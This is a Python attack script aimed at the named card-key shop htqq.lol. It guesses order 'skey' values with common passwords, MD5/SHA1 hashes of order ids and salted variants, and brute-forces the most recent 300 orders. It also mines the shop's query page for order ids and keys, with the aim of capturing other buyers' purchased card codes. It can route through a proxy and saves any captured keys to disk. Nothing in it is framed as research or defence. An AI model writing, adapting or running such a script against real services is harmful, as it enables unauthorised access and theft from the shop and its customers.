#!/usr/bin/env python3
"""htqq.lol 卡密抓取 — skey 爆破 + query 反查."""
from __future__ import annotations

import hashlib
import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path

BASE = "https://htqq.lol/shop"
PROXY = os.environ.get("PROXY_URL", "")
OUT = Path(os.environ.get("OUT", f"/tmp/htqq_capture_{int(time.time())}"))
OUT.mkdir(parents=True, exist_ok=True)

INPUTS = [
    "123456", "12345678", "password", "admin", "test", "abc123", "111111",
    "888888", "666666", "000000", "qwerty", "test123", "test@test.com",
    "MyPass2026", "kmtest123", "mypass123", "testpay@test.com",
    "qq123456", "a123456", "123123", "5201314", "iloveyou", "1", "0",
]


def curl(url: str, data: str | None = None, referer: str | None = None) -> str:
    cmd = [
        "curl", "-sk", "--max-time", "15", "-A", "Mozilla/5.0",
        "-H", "Accept-Language: zh-CN,zh;q=0.9",
    ]
    if PROXY:
        cmd += ["-x", PROXY]
    if referer:
        cmd += ["-H", f"Referer: {referer}"]
    if data is not None:
        cmd += ["-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded", "-d", data]
    cmd.append(url)
    for attempt in range(3):
        r = subprocess.run(cmd, capture_output=True, text=True)
        if r.stdout.strip():
            return r.stdout
        time.sleep(1)
    return r.stdout


def gen_skeys(oid: int) -> list[str]:
    oid_s = str(oid)
    keys = {
        oid_s, oid_s.zfill(8), oid_s.zfill(14), "", "test", "123456", "admin", "null", "0", "1",
        hashlib.md5(oid_s.encode()).hexdigest(),
        hashlib.md5(oid_s.encode()).hexdigest()[:16],
        hashlib.sha1(oid_s.encode()).hexdigest(),
    }
    for pw in INPUTS:
        keys.add(pw)
        keys.add(hashlib.md5(pw.encode()).hexdigest())
        keys.add(hashlib.md5(f"{oid_s}{pw}".encode()).hexdigest())
        keys.add(hashlib.md5(f"{pw}{oid_s}".encode()).hexdigest())
    for salt in ("htqq", "faka", "345a36b5fa7be2bdd2f1724157952938", "htqq.lol"):
        keys.add(hashlib.md5(f"{oid_s}{salt}".encode()).hexdigest())
        keys.add(hashlib.md5(f"{salt}{oid_s}".encode()).hexdigest())
    return list(keys)


def try_order(oid: int, skey: str) -> dict | None:
    body = curl(
        f"{BASE}/ajax.php?act=order",
        data=f"id={oid}&skey={skey}",
        referer=f"{BASE}/?mod=query",
    )
    if not body.strip():
        return None
    if "kminfo" in body:
        return {"hit": "kminfo", "id": oid, "skey": skey, "body": body}
    try:
        d = json.loads(body)
        if d.get("code") == 0 and "验证失败" not in d.get("msg", ""):
            return {"hit": "order_ok", "id": oid, "skey": skey, "body": body}
    except json.JSONDecodeError:
        pass
    return None


def scan_query_data(values: list[str]) -> list[dict]:
    hits = []
    for v in values:
        html = curl(f"{BASE}/?mod=query&data={v}", referer=f"{BASE}/?mod=query")
        if not html:
            continue
        for m in re.finditer(r"showOrder\((\d+),\s*'([^']+)'\)", html):
            hits.append({"type": "skey_html", "id": m.group(1), "skey": m.group(2), "query": v})
        if "kminfo" in html or ("卡密信息" in html and "没有查询" not in html):
            hits.append({"type": "kminfo_html", "query": v, "snippet": html[:500]})
    return hits


def main() -> None:
    findings: list[dict] = []
    log_lines: list[str] = []

    def log(msg: str) -> None:
        print(msg, flush=True)
        log_lines.append(msg)

    log(f"proxy={PROXY[:50]}... out={OUT}")

    gc_raw = curl(f"{BASE}/ajax.php?act=getcount", referer=f"{BASE}/")
    if not gc_raw.strip():
        log("ERROR: getcount empty — proxy dead?")
        sys.exit(1)
    orders = int(json.loads(gc_raw)["orders"])
    log(f"orders={orders}")

    # query 反查
    log("=== query&data= scan ===")
    qvals = INPUTS + [str(orders), str(orders - 1), str(orders - 10), "13800138000", "18888888888"]
    qhits = scan_query_data(qvals)
    for h in qhits:
        log(f"QUERY HIT: {h}")
        findings.append(h)
        if h.get("type") == "skey_html":
            r = try_order(int(h["id"]), h["skey"])
            if r:
                log(f"KM FROM QUERY: {r}")
                findings.append(r)

    # skey 爆破 recent 300
    log("=== skey brute ===")
    start_id = max(1, orders - 300)
    tested = 0
    for oid in range(start_id, orders + 1):
        for sk in gen_skeys(oid):
            r = try_order(oid, sk)
            tested += 1
            if r:
                log(f"*** CAPTURE *** {r}")
                findings.append(r)
                (OUT / "kminfo.json").write_text(json.dumps(r, ensure_ascii=False, indent=2))
            if tested % 1000 == 0:
                log(f"tested={tested} last_id={oid}")
            time.sleep(0.02)

    (OUT / "findings.json").write_text(json.dumps(findings, ensure_ascii=False, indent=2))
    (OUT / "log.txt").write_text("\n".join(log_lines))
    log(f"DONE findings={len(findings)}")
    if not findings:
        log("NO KM CAPTURED")
        sys.exit(2)
    sys.exit(0)


if __name__ == "__main__":
    main()
